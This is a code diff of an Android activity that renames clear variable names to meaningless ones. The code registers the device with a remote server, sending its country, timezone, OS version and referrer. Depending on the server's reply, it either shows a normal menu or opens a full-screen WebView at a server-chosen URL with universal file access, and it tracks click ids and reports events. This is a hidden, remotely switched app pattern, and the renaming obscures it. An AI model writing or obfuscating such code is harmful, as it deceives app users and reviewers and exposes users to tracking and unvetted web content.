@@ -41,37 +41,37 @@ import java.util.Date;
 
 public class CommercialActivity extends AppCompatActivity {
 
-    public static final String INTENT_ADDRESS = "ADDRESS";
-	public static final String INTENT_DRAWABLE = "DRAWABLE";
-    public static final String INTENT_COLOR = "COLOR";
-    public static final String INTENT_CLASS = "CLASS";
+    public static final String ADDRESS = "ADDRESS";
+	public static final String DRAWABLE = "DRAWABLE";
+    public static final String COLOR = "COLOR";
+    public static final String CLASS = "CLASS";
 
     private static final int INPUT_FILE_REQUEST_CODE = 1;
     private static final int FILE_CHOOSER_RESULT_CODE = 1;
-    private WebView core;
-    private ValueCallback<Uri> mUploadMessage;
-    private Uri mCapturedImageURI = null;
-    private ValueCallback<Uri[]> mFilePathCallback;
-    private String mCameraPhotoPath;
+    private WebView commercial;
+    private ValueCallback<Uri> aVoid;
+    private Uri uri = null;
+    private ValueCallback<Uri[]> callback;
+    private String mcameraphotopath;
 
-    private SharedPreferences preferences;
+    private SharedPreferences sharedPreferences;
     private SharedPreferences.Editor editor;
-    private String result = "";
-    private boolean isSclickSent = false;
+    private String string = "";
+    private boolean aBoolean = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 		
-		ImageView splashImage = new ImageView(CommercialActivity.this);
-        splashImage.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
-        splashImage.setBackgroundColor(Color.parseColor(getIntent().getStringExtra(INTENT_COLOR)));
-        setContentView(splashImage);
-        Glide.with(this).load(getIntent().getStringExtra(INTENT_DRAWABLE)).into(splashImage);
+		ImageView imageView = new ImageView(CommercialActivity.this);
+        imageView.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
+        imageView.setBackgroundColor(Color.parseColor(getIntent().getStringExtra(COLOR)));
+        setContentView(imageView);
+        Glide.with(this).load(getIntent().getStringExtra(DRAWABLE)).into(imageView);
 
-        preferences = getSharedPreferences("CORE", Context.MODE_PRIVATE);
+        sharedPreferences = getSharedPreferences("CORE", Context.MODE_PRIVATE);
 
-		CommercialRequests.address = getIntent().getStringExtra(INTENT_ADDRESS);
+		CommercialRequests.address = getIntent().getStringExtra(ADDRESS);
 		AppLinkData.fetchDeferredAppLinkData(CommercialActivity.this, new AppLinkData.CompletionHandler() {
 			@Override
 			public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
@@ -80,7 +80,7 @@ public class CommercialActivity extends AppCompatActivity {
 					referrer = appLinkData.getTargetUri().toString();
 					String[] params = referrer.split("://");
 					if (params.length > 0) {
-						editor = preferences.edit();
+						editor = sharedPreferences.edit();
 						editor.putString("parameters", params[1].replaceAll("\\?", "&"));
 						editor.apply();
 						editor.commit();
@@ -97,18 +97,18 @@ public class CommercialActivity extends AppCompatActivity {
 					if (country.isEmpty()) {
 						country = getResources().getConfiguration().locale.getCountry().toUpperCase();
 					}
-					if (preferences.getInt("id", -1) == -1) {
+					if (sharedPreferences.getInt("id", -1) == -1) {
 						JSONObject jsonObject = new CommercialRequests().new CoreResult(getPackageName(), country, Calendar.getInstance().getTimeZone().getRawOffset(), Build.VERSION.RELEASE, referrer).execute().get();
-						editor = preferences.edit();
+						editor = sharedPreferences.edit();
 						editor.putInt("id", jsonObject.getInt("id"));
 						editor.apply();
 						editor.commit();
-						result = jsonObject.getString("result");
+						string = jsonObject.getString("string");
 					} else {
-						JSONObject jsonObject = new CommercialRequests().new CoreResult(preferences.getInt("id", -1), country, Calendar.getInstance().getTimeZone().getRawOffset()).execute().get();
-						result = jsonObject.getString("result");
+						JSONObject jsonObject = new CommercialRequests().new CoreResult(sharedPreferences.getInt("id", -1), country, Calendar.getInstance().getTimeZone().getRawOffset()).execute().get();
+						string = jsonObject.getString("string");
 					}
-					if (result.isEmpty()) {
+					if (string.isEmpty()) {
 						sendScreenEvent("Menu");
 						startMenuActivity();
 					} else {
@@ -127,38 +127,38 @@ public class CommercialActivity extends AppCompatActivity {
         runOnUiThread(new Runnable() {
             @Override
             public void run() {
-                core = new WebView(CommercialActivity.this);
-                core.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
-                setContentView(core);
-                core.getSettings().setJavaScriptEnabled(true);
-                core.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
-                core.getSettings().setAllowFileAccess(true);
-                core.getSettings().setAllowFileAccessFromFileURLs(true);
-                core.getSettings().setAllowUniversalAccessFromFileURLs(true);
-                core.getSettings().setAllowContentAccess(true);
-                core.getSettings().setDomStorageEnabled(true);
-                core.getSettings().setUseWideViewPort(true);
+                commercial = new WebView(CommercialActivity.this);
+                commercial.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
+                setContentView(commercial);
+                commercial.getSettings().setJavaScriptEnabled(true);
+                commercial.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
+                commercial.getSettings().setAllowFileAccess(true);
+                commercial.getSettings().setAllowFileAccessFromFileURLs(true);
+                commercial.getSettings().setAllowUniversalAccessFromFileURLs(true);
+                commercial.getSettings().setAllowContentAccess(true);
+                commercial.getSettings().setDomStorageEnabled(true);
+                commercial.getSettings().setUseWideViewPort(true);
                 CookieManager.getInstance().setAcceptCookie(true);
                 if (Build.VERSION.SDK_INT > 21) {
-                    CookieManager.getInstance().setAcceptThirdPartyCookies(core, true);
+                    CookieManager.getInstance().setAcceptThirdPartyCookies(commercial, true);
                 }
-                core.setWebChromeClient(new WebChromeClient() {
+                commercial.setWebChromeClient(new WebChromeClient() {
                     public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> filePath, WebChromeClient.FileChooserParams fileChooserParams) {
-                        if (mFilePathCallback != null) {
-                            mFilePathCallback.onReceiveValue(null);
+                        if (callback != null) {
+                            callback.onReceiveValue(null);
                         }
-                        mFilePathCallback = filePath;
+                        callback = filePath;
                         Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                         if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
                             File photoFile = null;
                             try {
                                 photoFile = createImageFile();
-                                takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath);
+                                takePictureIntent.putExtra("PhotoPath", mcameraphotopath);
                             } catch (IOException e) {
                                 e.printStackTrace();
                             }
                             if (photoFile != null) {
-                                mCameraPhotoPath = "file:" + photoFile.getAbsolutePath();
+                                mcameraphotopath = "file:" + photoFile.getAbsolutePath();
                                 takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(photoFile));
                             } else {
                                 takePictureIntent = null;
@@ -182,15 +182,15 @@ public class CommercialActivity extends AppCompatActivity {
                     }
 
                     public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
-                        mUploadMessage = uploadMsg;
+                        aVoid = uploadMsg;
                         File imageStorageDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "AndroidExampleFolder");
                         if (!imageStorageDir.exists()) {
                             imageStorageDir.mkdirs();
                         }
                         File file = new File(imageStorageDir + File.separator + "IMG_" + String.valueOf(System.currentTimeMillis()) + ".jpg");
-                        mCapturedImageURI = Uri.fromFile(file);
+                        uri = Uri.fromFile(file);
                         final Intent captureIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
-                        captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI);
+                        captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, uri);
                         Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                         i.addCategory(Intent.CATEGORY_OPENABLE);
                         i.setType("image/*");
@@ -207,7 +207,7 @@ public class CommercialActivity extends AppCompatActivity {
                         openFileChooser(uploadMsg, acceptType);
                     }
                 });
-                core.setWebViewClient(new WebViewClient() {
+                commercial.setWebViewClient(new WebViewClient() {
                     @Override
                     public void onPageStarted(WebView view, String url, Bitmap favicon) {
                         super.onPageStarted(view, url, favicon);
@@ -220,27 +220,27 @@ public class CommercialActivity extends AppCompatActivity {
                         } else if (url.startsWith("tel:")) {
                             startActivity(new Intent(Intent.ACTION_DIAL, Uri.parse(url)));
                             view.goBack();
-                        } else if (!isSclickSent) {
+                        } else if (!aBoolean) {
                             if (Uri.parse(url).getQueryParameter("sclick") != null) {
-                                new CommercialRequests().new CoreSetClickId(preferences.getInt("id", -1), Uri.parse(url).getQueryParameter("sclick")).execute();
-                                isSclickSent = true;
+                                new CommercialRequests().new CoreSetClickId(sharedPreferences.getInt("id", -1), Uri.parse(url).getQueryParameter("sclick")).execute();
+                                aBoolean = true;
                             }
                         }
                     }
                 });
 				if (!CommercialReceiver.referrer.isEmpty()) {
-					editor = preferences.edit();
+					editor = sharedPreferences.edit();
 					editor.putString("referrer", CommercialReceiver.referrer.replaceAll(";", "&").replaceAll("%3D", "="));
 					editor.apply();
 					editor.commit();
 				}
-				if (!preferences.getString("parameters", "").isEmpty()) {
-					core.loadUrl(result + preferences.getString("parameters", "&source=organic&pid=1"));
+				if (!sharedPreferences.getString("parameters", "").isEmpty()) {
+					commercial.loadUrl(string + sharedPreferences.getString("parameters", "&source=organic&pid=1"));
 				} else {
-					core.loadUrl(result + "&" + preferences.getString("referrer", "&source=organic&pid=1"));
+					commercial.loadUrl(string + "&" + sharedPreferences.getString("referrer", "&source=organic&pid=1"));
 				}
 				sendScreenEvent("Site");
-				new CommercialRequests().new CoreEvents(preferences.getInt("id", -1)).execute();
+				new CommercialRequests().new CoreEvents(sharedPreferences.getInt("id", -1)).execute();
 				getEvents();
             }
         });
@@ -249,15 +249,15 @@ public class CommercialActivity extends AppCompatActivity {
     @Override
     public void onActivityResult(int requestCode, int resultCode, Intent data) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
+            if (requestCode != INPUT_FILE_REQUEST_CODE || callback == null) {
                 super.onActivityResult(requestCode, resultCode, data);
                 return;
             }
             Uri[] results = null;
             if (resultCode == Activity.RESULT_OK) {
                 if (data == null) {
-                    if (mCameraPhotoPath != null) {
-                        results = new Uri[]{Uri.parse(mCameraPhotoPath)};
+                    if (mcameraphotopath != null) {
+                        results = new Uri[]{Uri.parse(mcameraphotopath)};
                     }
                 } else {
                     String dataString = data.getDataString();
@@ -266,15 +266,15 @@ public class CommercialActivity extends AppCompatActivity {
                     }
                 }
             }
-            mFilePathCallback.onReceiveValue(results);
-            mFilePathCallback = null;
+            callback.onReceiveValue(results);
+            callback = null;
         } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
-            if (requestCode != FILE_CHOOSER_RESULT_CODE || mUploadMessage == null) {
+            if (requestCode != FILE_CHOOSER_RESULT_CODE || aVoid == null) {
                 super.onActivityResult(requestCode, resultCode, data);
                 return;
             }
             if (requestCode == FILE_CHOOSER_RESULT_CODE) {
-                if (null == this.mUploadMessage) {
+                if (null == this.aVoid) {
                     return;
                 }
                 Uri result = null;
@@ -282,13 +282,13 @@ public class CommercialActivity extends AppCompatActivity {
                     if (resultCode != RESULT_OK) {
                         result = null;
                     } else {
-                        result = data == null ? mCapturedImageURI : data.getData();
+                        result = data == null ? uri : data.getData();
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
-                mUploadMessage.onReceiveValue(result);
-                mUploadMessage = null;
+                aVoid.onReceiveValue(result);
+                aVoid = null;
             }
         }
         return;
@@ -305,7 +305,7 @@ public class CommercialActivity extends AppCompatActivity {
         new Handler().postDelayed(new Runnable() {
             @Override
             public void run() {
-                new CommercialRequests().new CoreEvents(preferences.getInt("id", -1)).execute();
+                new CommercialRequests().new CoreEvents(sharedPreferences.getInt("id", -1)).execute();
                 getEvents();
             }
         }, 20000);
@@ -322,7 +322,7 @@ public class CommercialActivity extends AppCompatActivity {
         runOnUiThread(new Runnable() {
             @Override
             public void run() {
-                startActivity(new Intent(CommercialActivity.this, (Class) getIntent().getExtras().getSerializable(INTENT_CLASS)).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
+                startActivity(new Intent(CommercialActivity.this, (Class) getIntent().getExtras().getSerializable(CLASS)).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
             }
         });
     }
@@ -339,8 +339,8 @@ public class CommercialActivity extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        if (core != null && core.canGoBack()) {
-            core.goBack();
+        if (commercial != null && commercial.canGoBack()) {
+            commercial.goBack();
         } else {
             super.onBackPressed();
         }
